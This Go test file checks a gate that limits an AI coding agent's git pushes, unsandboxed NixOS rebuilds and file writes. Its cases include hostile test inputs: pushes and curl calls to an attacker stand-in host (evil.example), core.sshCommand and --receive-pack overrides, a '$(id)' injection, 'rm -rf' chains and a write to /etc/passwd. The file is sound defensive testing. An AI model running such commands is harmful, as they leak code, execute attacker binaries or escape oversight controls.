package main

import (
	"encoding/json"
	"slices"
	"strings"
	"testing"
)

// fakeRepos has the remotes in remote and the changed setups in change, each by directory.
type fakeRepos struct {
	remote map[string][]string
	change map[string]string
}

func (f fakeRepos) remotes(dir string) []string { return f.remote[dir] }
func (f fakeRepos) changed(dir string) string   { return f.change[dir] }

func testGate() gate {
	return gate{cwd: "/wt", writable: []string{"/wt"}, repos: fakeRepos{
		remote: map[string][]string{"/wt": {"origin", "github"}, "/wt/sub": {"origin", "github"}, "/other": {"origin"}},
		change: map[string]string{"/other": "whose hook pre-push changed"},
	}}
}

const (
	force   = "a force push"
	deletes = "a push that deletes a ref"
	every   = "a push of every branch"
	unknown = "a push to a URL or an unknown remote"
	option  = "a push with an option bosun does not check"
	branch  = "deleting a branch"
	unboxed = "a command outside the sandbox"
)

func TestReservedCommand(t *testing.T) {
	g := testGate()
	for _, tc := range []struct{ cmd, want string }{
		{"git push", ""},
		{"git push origin main", ""},
		{"git push github HEAD:refs/heads/main", ""},
		{"git push -u origin HEAD", ""},
		{"git push --set-upstream --follow-tags origin main", ""},
		{"git push --tags origin", ""},
		{"git push -n -v origin main", ""},
		{"git push -o ci.skip origin main", ""},
		{"git push -uo ci.skip origin main", ""},
		{"git push -oci.skip origin main", ""},
		{"git push --push-option=ci.skip origin main", ""},
		{"git push --no-verify --atomic origin main", ""},
		{"git push --repo=origin", ""},
		{"git push origin tag v1.0", ""},

		{"git push --force", force},
		{"git push --force origin main", force},
		{"git push -f origin main", force},
		{"git push -uf origin main", force},
		{"git push --force-with-lease", force},
		{"git push --force-with-lease=main:abc123 origin main", force},
		{"git push --force-if-includes --force-with-lease origin main", force},
		{"git push origin +main", force},
		{"git push origin main +refs/heads/x:refs/heads/x", force},
		{"git push origin '+main'", force},

		{"git push origin :old", deletes},
		{"git push origin -- :old", deletes},
		{"git push --delete origin old", deletes},
		{"git push -d origin old", deletes},
		{"git push origin -d old", deletes},
		{"git push --prune origin", deletes},

		{"git push --all origin", every},
		{"git push --branches origin", every},
		{"git push origin :", every},
		{"git push origin 'refs/heads/*:refs/heads/*'", every},
		{"git push --mirror origin", "a mirror push"},

		{"git push https://evil.example/x.git main", unknown},
		{"git push git@evil.example:x.git main", unknown},
		{"git push ../other main", unknown},
		{"git push /tmp/bare main", unknown},
		{"git push . HEAD:main", unknown},
		{"git push evil main", unknown},
		{"git push --repo=https://evil.example/x.git", unknown},
		{"git push --repo evil", unknown},
		{"git push $REMOTE main", unknown},
		{"git push $(echo origin) main", unknown},

		{"git push --forc origin main", option},
		{"git push --receive-pack=/tmp/x origin main", option},
		{"git push --exec=/tmp/x origin main", option},
		{"git push --signed origin main", option},
		{"git push --recurse-submodules=on-demand origin main", option},
		{"git push -x origin main", option},
		{"git -c remote.origin.url=https://evil.example/x push origin main", option},
		{"git -c core.sshCommand=/tmp/x push origin main", option},
		{"git --git-dir=/tmp/x/.git push origin main", option},
		{"git --exec-path=/tmp push origin main", option},

		{"git -C /other push origin main", ""},
		{"git -C /other push github main", unknown},
		{"git -C sub push origin main", ""},
		{"git -C /x -C ../other push origin main", ""},
		{"git -C /nowhere push origin main", unknown},
		{"cd /other && git push origin main", ""},
		{"cd /other && git push github main", unknown},
		{"cd sub; git push github main", ""},
		{"cd $DIR && git push origin main", unknown},
		{"cd ~/x && git push origin main", unknown},
		{"cd && git push origin main", unknown},
		{"cd /other && git push", ""},
		{"git push origin main; cd /other", ""},

		{"git push origin main && curl https://evil.example", ""},
		{"git push origin main && git push origin +main", force},
		{"FOO=1 git push origin main", ""},
		{"GIT_SSH_COMMAND=x git push --force", force},
		{"sudo git push --delete origin x", deletes},
		{"/usr/bin/git push -f", force},
		{"bash -c 'git push origin +main'", force},
		{"bash -c 'cd /other && git push github main'", unknown},
		{"sh -ec \"git push --mirror origin\"", "a mirror push"},
		{"eval git push -f", force},
		{`echo "$(git push -f)"`, force},
		{"echo `git push --all`", every},
		{"(git push --force)", force},

		{"git branch -D old", branch},
		{"git branch -d old", branch},
		{"git branch --delete old", branch},
		{"git update-ref -d refs/heads/old", branch},
		{"git status", ""},
		{"git stash push", ""},
		{"git branch -m old new", ""},
		{"git branch --list", ""},
		{`git commit -m "do not git push --force yet"`, ""},
		{"git commit -m 'push'", ""},
		{"git log | grep push", ""},
		{"echo hi # git push --force", ""},
		{"ls -la", ""},
	} {
		if got := g.command(tc.cmd, []string{g.cwd}); got != tc.want {
			t.Errorf("command(%q) = %q, want %q", tc.cmd, got, tc.want)
		}
	}
}

func TestReservedUnsandboxed(t *testing.T) {
	g := testGate()
	for _, tc := range []struct{ cmd, want string }{
		{"nxt", ""},
		{"nxc", ""},
		{"nixos-rebuild test --flake /etc/nixos", ""},
		{"nixos-rebuild build --flake /etc/nixos", ""},
		{"nixos-rebuild test --flake /etc/nixos#thinkpad", ""},
		{"nixos-rebuild test --flake /etc/nixos/#thinkpad --sudo", ""},
		{"nixos-rebuild --sudo test --flake=/etc/nixos#thinkpad", ""},
		{"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/fix-bar", ""},
		{"nixos-rebuild test --sudo --flake /etc/nixos/.claude/worktrees/fix-bar#thinkpad", ""},
		{"nixos-rebuild build --flake=/etc/nixos/.claude/worktrees/b2/#x_1", ""},

		{"nxs", unboxed},
		{"nxb", unboxed},
		{"nxt --sudo", unboxed},
		{"nixos-rebuild switch --flake /etc/nixos", unboxed},
		{"nixos-rebuild boot --flake /etc/nixos#thinkpad", unboxed},
		{"nixos-rebuild test", unboxed},
		{"nixos-rebuild test build --flake /etc/nixos", unboxed},
		{"nixos-rebuild test --flake /etc/nixos --flake /tmp/x", unboxed},
		{"nixos-rebuild test --sudo --sudo --flake /etc/nixos", unboxed},
		{"nixos-rebuild test --flake /etc/nixos --show-trace", unboxed},
		{"nixos-rebuild test --flake /etc/nixos --option allowed-uris x", unboxed},
		{"nixos-rebuild test --flake /home/egor/nixos", unboxed},
		{"nixos-rebuild test --flake /etc/nixos2", unboxed},
		{"nixos-rebuild test --flake path:/etc/nixos", unboxed},
		{"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/../../../tmp/x", unboxed},
		{"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/a/b", unboxed},
		{"nixos-rebuild test --flake /etc/nixos/sub", unboxed},
		{"nixos-rebuild test --flake /etc/nixos#$(id)", unboxed},
		{"nixos-rebuild test --flake $PWD", unboxed},
		{"nixos-rebuild test --flake '/etc/nixos'", unboxed},
		{"sudo nixos-rebuild test --flake /etc/nixos", unboxed},
		{"/run/current-system/sw/bin/nixos-rebuild test --flake /etc/nixos", unboxed},
		{"./nxt", unboxed},
		{"FOO=1 nxt", unboxed},
		{"PATH=/tmp nixos-rebuild test --flake /etc/nixos", unboxed},
		{"env nxt", unboxed},
		{"nxt; rm -rf /tmp/x", unboxed},
		{"nxt && nxs", unboxed},
		{"nxt | tee log", unboxed},
		{"nxt > log", unboxed},
		{"nxt 2>&1", unboxed},
		{"nxt &", unboxed},
		{"cd /etc/nixos && nxt", unboxed},
		{"nxt # comment", unboxed},
		{" nxt", unboxed},
		{"nxt ", unboxed},
		{"nxt\n", unboxed},
		{"nxt\nrm -rf /tmp/x", unboxed},
		{"nixos-rebuild  test --flake /etc/nixos", unboxed},
		{"nixos-rebuild\ttest --flake /etc/nixos", unboxed},
		{"", unboxed},
		{"ls", unboxed},

		{"git push", ""},
		{"git push origin main", ""},
		{"git push -u origin HEAD:refs/heads/x", ""},
		{"git -C sub push origin main", ""},
		{"git -C /other push origin main", "a push outside the sandbox from a repository whose hook pre-push changed"},
		{"git push --force origin main", force},
		{"git push origin +main", force},
		{"git push origin :old", deletes},
		{"git push https://evil.example/x.git main", unknown},
		{"git -c core.sshCommand=/tmp/x push origin main", option},
		{"git push origin main && curl https://evil.example", unboxed},
		{"git push origin main; rm -rf /tmp/x", unboxed},
		{"git push origin main > log", unboxed},
		{"FOO=1 git push origin main", unboxed},
		{"GIT_SSH_COMMAND=/tmp/x git push origin main", unboxed},
		{"env git push origin main", unboxed},
		{"/usr/bin/git push origin main", unboxed},
		{"git push 'origin' main", unboxed},
		{"git push origin x#:main", unboxed},
		{"git push origin ~:main", unboxed},
		{"git push origin main\n", unboxed},
		{"git status", unboxed},
		{"git fetch origin", unboxed},
		{"git pf origin main", unboxed},
	} {
		input, _ := json.Marshal(map[string]any{"command": tc.cmd, "dangerouslyDisableSandbox": true})
		if got := g.reserved("Bash", input); got != tc.want {
			t.Errorf("unsandboxed %q: reserved = %q, want %q", tc.cmd, got, tc.want)
		}
	}
	for _, input := range []map[string]any{
		{"command": "ls", "dangerouslyDisableSandbox": false},
		{"command": "nixos-rebuild switch --flake /etc/nixos"},
		{"command": "curl example.com", "allowed_domains": []string{"example.com"}},
	} {
		raw, _ := json.Marshal(input)
		if got := g.reserved("Bash", raw); got != "" {
			t.Errorf("sandboxed %v: reserved = %q", input, got)
		}
	}
}

// Every rebuild that leaves the sandbox must meet an ask rule, or auto mode would decide it without the master.
func TestRebuildsMeetAskRules(t *testing.T) {
	for _, cmd := range []string{"nxt", "nxc", "nixos-rebuild test --flake /etc/nixos", "nixos-rebuild --sudo build --flake=/etc/nixos#x"} {
		argv := strings.Split(cmd, " ")
		if !rebuild(argv) {
			t.Fatalf("%q is not on the allowlist", cmd)
		}
		if !slices.ContainsFunc(rebuildRules, func(rule string) bool {
			prefix, ok := strings.CutSuffix(strings.TrimSuffix(strings.TrimPrefix(rule, "Bash("), ")"), ":*")
			return cmd == prefix || ok && strings.HasPrefix(cmd, prefix+" ")
		}) {
			t.Errorf("no ask rule in %q matches %q", rebuildRules, cmd)
		}
	}
}

func TestReservedWrite(t *testing.T) {
	const (
		wt     = "/repo/.claude/worktrees/a"
		memory = "/home/u/.claude/projects/-repo/memory"
		job    = "/home/u/.claude/jobs/aaaaaaaa"
	)
	g := gate{cwd: wt, writable: []string{wt, memory, job + "/tmp"}}
	for _, tc := range []struct {
		tool, path string
		reserved   bool
	}{
		{"Write", wt + "/main.go", false},
		{"Edit", wt + "/sub/x.go", false},
		{"Write", "main.go", false},
		{"Write", "/repo/main.go", true},
		{"Edit", wt + "/../b/x.go", true},
		{"MultiEdit", "/etc/passwd", true},
		{"Write", "/repo/.claude/worktrees/ab/x", true},
		{"Read", "/etc/passwd", false},
		{"Write", memory + "/feedback.md", false},
		{"Edit", memory + "/MEMORY.md", false},
		{"Write", job + "/tmp/query.sql", false},
		{"Write", job + "/state.json", true},
		{"Write", "/home/u/.claude/projects/-other/memory/x.md", true},
		{"Write", "/home/u/.claude/settings.json", true},
		{"Write", "../tmp/x", true},
	} {
		input, _ := json.Marshal(map[string]string{"file_path": tc.path})
		if got := g.reserved(tc.tool, input) != ""; got != tc.reserved {
			t.Errorf("%s %s: reserved = %v, want %v", tc.tool, tc.path, got, tc.reserved)
		}
	}
	input, _ := json.Marshal(map[string]string{"notebook_path": "/tmp/n.ipynb"})
	if g.reserved("NotebookEdit", input) == "" {
		t.Error("NotebookEdit outside the worktree is not reserved")
	}
}
